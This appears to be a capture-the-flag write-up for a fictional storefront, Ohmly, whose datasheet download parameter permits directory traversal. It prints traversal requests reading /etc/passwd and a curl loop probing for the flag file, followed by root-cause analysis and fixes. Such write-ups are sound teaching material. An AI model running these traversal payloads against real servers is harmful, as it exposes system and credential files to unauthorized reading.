# Ohmly — Path Traversal via Datasheet Download Endpoint

**Category:** Web
**Difficulty:** Easy
**Points:** 50 XP

## Summary

Ohmly is a fictional electronic-components storefront. Product pages link out to
PDF datasheets through a download endpoint that takes a raw filename and serves
it directly from disk with no path sanitization, allowing classic directory
traversal to read arbitrary files outside the datasheets folder — including the
flag.

## Recon

The homepage exposes only category and product links (`/part?pn=<PART>`), no
direct file-download links. Pulling a product page revealed the actual
datasheet endpoint:

```
GET /part?pn=NE555P
```

Response contained:

```
href="/datasheet?doc=ne555.pdf"
```

So the download endpoint takes a single query parameter, `doc`, and returns a
PDF given a bare filename:

```
GET /datasheet?doc=ne555.pdf   -> 200 OK (2675 bytes, valid PDF)
```

## Vulnerability

The `doc` parameter is passed straight through to a filesystem read with no
normalization or allow-listing, so `../` sequences climb out of the
datasheets directory:

```
GET /datasheet?doc=../../../../etc/passwd   -> 200 OK (880 bytes)
```

Response contained a valid `/etc/passwd` listing, confirming unrestricted
directory traversal on the underlying file read.

## Exploitation

With traversal confirmed, the next step was locating the flag file. A short
wordlist of likely filenames/depths was tried against the same parameter:

```bash
TARGET="https://<challenge-host>"

for PAYLOAD in "../../../../flag.txt" "../../../flag.txt" "../../flag.txt" "../flag.txt"; do
  curl -s "$TARGET/datasheet?doc=$PAYLOAD"
done
```

Result:

```
GET /datasheet?doc=../../../../flag.txt   -> 200 OK (43 bytes)
```

Body contained the flag.

## Root Cause

- User-supplied filename concatenated directly into a filesystem path with no
  canonicalization, `../` stripping, or restriction to a whitelisted
  datasheets directory.
- No check that the resolved absolute path stays within the intended base
  directory (`os.path.realpath` / `path.resolve` + prefix check pattern was
  missing).

## Fix Recommendations

- Resolve the requested path and verify it's still within the datasheets
  base directory before opening the file (reject if not, don't just strip
  `../`).
- Prefer serving files by an opaque ID/lookup table (e.g. `doc=1` mapped to
  a known filename server-side) instead of accepting a client-supplied path
  at all.
- Run the file-serving process with least privilege / a chroot or container
  mount so even a successful traversal can't reach sensitive files.

## Flag

```
WEBVERSE{**************REDACTED**************}
```
